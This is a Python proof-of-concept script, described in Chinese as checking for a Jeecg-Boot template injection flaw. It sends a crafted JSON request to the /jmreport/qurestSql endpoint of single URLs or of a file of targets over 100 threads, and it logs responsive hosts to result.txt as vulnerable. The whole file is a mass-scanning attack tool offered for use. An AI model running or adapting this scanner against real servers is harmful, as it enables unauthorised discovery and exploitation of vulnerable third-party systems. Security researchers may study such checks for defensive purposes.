import requests,sys,re,argparse,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""
                                                                                                                     
         ,---._                                                                                                      
       .-- -.' \                                                       ,---,.                         ___            
       |    |   :                                                    ,'  .'  \                      ,--.'|_          
       :    ;   |                                            ,---,.,---.' .' |   ,---.     ,---.    |  | :,'         
       :        |                               ,----._,.  ,'  .' ||   |  |: |  '   ,'\   '   ,'\   :  : ' :         
       |    :   :   ,---.     ,---.     ,---.  /   /  ' /,---.'   ,:   :  :  / /   /   | /   /   |.;__,'  /          
       :           /     \   /     \   /     \|   :     ||   |    |:   |    ; .   ; ,. :.   ; ,. :|  |   |           
       |    ;   | /    /  | /    /  | /    / '|   | .\  .:   :  .' |   :     \'   | |: :'   | |: ::__,'| :           
   ___ l         .    ' / |.    ' / |.    ' / .   ; ';  |:   |.'   |   |   . |'   | .; :'   | .; :  '  : |__         
 /    /\    J   :'   ;   /|'   ;   /|'   ; :__'   .   . |`---'     '   :  '; ||   :    ||   :    |  |  | '.'|        
/  ../  `..-    ,'   |  / |'   |  / |'   | '.'|`---`-'| |          |   |  | ;  \   \  /  \   \  /   ;  :    ;        
\    \         ; |   :    ||   :    ||   :    :.'__/\_: |          |   :   /    `----'    `----'    |  ,   /         
 \    \      ,'   \   \  /  \   \  /  \   \  / |   :    :          |   | ,'                          ---`-'          
  "---....--'      `----'    `----'    `----'   \   \  /           `----'                                            
                                                 `--`-'                                                              
"""

    print(test)



def main():
    banner()
    parser=argparse.ArgumentParser(description='Jeecg-Boot模板注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



def poc(target):
    url_payload= '/jeecg-boot/jmreport/qurestSql'
    headers={
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/115.0.0.0Safari/537.36',
        'Content-Length':'112',
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate,br',
        'Content-Type':'application/json',
        'Origin':'http://172.16.10.10:8080',
    }
    data={"apiSelectId":"1290104038414721025","id":"1"}

    try:
        res1=requests.post(url=target+url_payload,headers=headers,json=data,timeout=10)
        if json.loads(res1.text)['code']==200 and res1.status_code==200:
            print( f"[+]{target} 存在漏洞！")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')



if __name__ =='__main__':
    main()
